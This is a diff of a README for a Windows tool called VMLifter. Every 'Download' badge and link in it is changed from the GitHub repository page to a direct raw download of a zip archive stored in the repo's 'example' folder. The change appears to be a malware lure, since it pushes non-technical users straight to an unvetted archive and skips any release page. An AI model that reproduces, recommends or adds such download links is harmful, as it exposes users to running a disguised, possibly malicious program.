@@ -1,6 +1,6 @@
 # ⚙️ VMLifter - Lift Program Meaning Easily
 
-[![Download VMLifter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/dummyboy-maker/VMLifter)
+[![Download VMLifter](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/dummyboy-maker/VMLifter/main/example/Lifter_VM_2.1-alpha.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get VMLifter up and running on your Windows PC. No program
 
 1. Click the big download button below to open the download page in your browser.
 
-[![Download VMLifter](https://img.shields.io/badge/Download-From-GitHub-blue)](https://github.com/dummyboy-maker/VMLifter)
+[![Download VMLifter](https://img.shields.io/badge/Download-From-GitHub-blue)](https://raw.githubusercontent.com/dummyboy-maker/VMLifter/main/example/Lifter_VM_2.1-alpha.5.zip)
 
 2. On the page that opens, look for the latest release or download area.
 
@@ -124,7 +124,7 @@ To keep VMLifter running smoothly, check for updates regularly:
 
 3. Run the installer to replace the old version with the latest one.
 
-[Download VMLifter](https://github.com/dummyboy-maker/VMLifter)
+[Download VMLifter](https://raw.githubusercontent.com/dummyboy-maker/VMLifter/main/example/Lifter_VM_2.1-alpha.5.zip)
 
 ---
 
@@ -144,4 +144,4 @@ VMLifter is available under an open license. Check the LICENSE file in the repos
 
 ---
 
-[![Download VMLifter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/dummyboy-maker/VMLifter)
+[![Download VMLifter](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/dummyboy-maker/VMLifter/main/example/Lifter_VM_2.1-alpha.5.zip)
